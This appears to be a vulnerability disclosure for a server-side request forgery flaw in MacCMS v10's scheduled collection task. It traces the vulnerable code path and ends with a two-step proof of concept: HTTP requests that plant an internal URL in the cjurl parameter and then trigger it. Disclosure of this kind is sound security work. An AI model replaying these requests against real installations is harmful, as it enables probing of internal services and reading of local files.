# Vendor

magicblack

# Product

MacCMSv10

# version

v2025.1000.4050

# Download 

https://github.com/magicblack/maccms10

https://www.maccms.cn/down.html

# Vulnerability

SSRF

# Description

When a scheduled task with file set to cj is executed, the col_url method in the Cj controller is called. This method uses the Collection utility to fetch content from a URL specified in the cjurl parameter of the scheduled task. There is no validation to prevent the use of internal or local URLs, allowing an attacker to make the server send requests to arbitrary internal services.
# Analysis

Timming Controller (application/api/controller/Timming.php): The cj method calls the col_all method in the Cj controller. application/api/controller/Timming.php:82
```
82 |         $request->col_all($output);
```

Cj Controller (application/admin/controller/Cj.php): The col_all method calls the col_url method. application/admin/controller/Cj.php:134
```
134 |         $this->col_url($param);
```

col_url Method in Cj Controller: This method creates a new Collection object and calls its url_list and get_url_lists methods. The get_url_lists method will then use mac_curl_get to fetch the content from the URL specified in cjurl. application/admin/controller/Cj.php:151-152
```
151 |         $collection = new cjOper();
152 |         $urls = $collection->url_list($data);
```
Because there are no restrictions on the cjurl parameter, an attacker can specify an internal IP address or a file:// URI to access local resources.

Vulnerability Verification:

<img width="1056" height="509" alt="image" src="https://github.com/user-attachments/assets/c40cd6f3-263a-42aa-b9f3-9834d4e6608f" />

Then let's trigger this ssrf:

<img width="1401" height="344" alt="image" src="https://github.com/user-attachments/assets/b12216ec-ae7b-4bd4-b475-86c5359dcf4d" />

# POC
```
This is a two-step vulnerability that requires administrator privileges.

Step 1: Create a Malicious Scheduled Task

Log in as an administrator and create a new scheduled task with the following properties:

POST /admin1.php/admin/timming/info.html HTTP/1.1
Host: 192.168.1.81:8082
Content-Length: 147
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=XXX

__token__=b8d3535096a5784352faec9f17ad59d4&status=0&name=ssrf&des=&file=collect&param=cjurl%3Dhttp%3A%2F%2F192.168.1.81%3A9898%2F123.php%3Fid%3D111

Step 2: Trigger the Vulnerability
Send a GET request to the following URL to trigger the task:
GET /api.php/timming/index.html?enforce=1&name=ssrf HTTP/1.1
Host: 192.168.1.81:8082

```

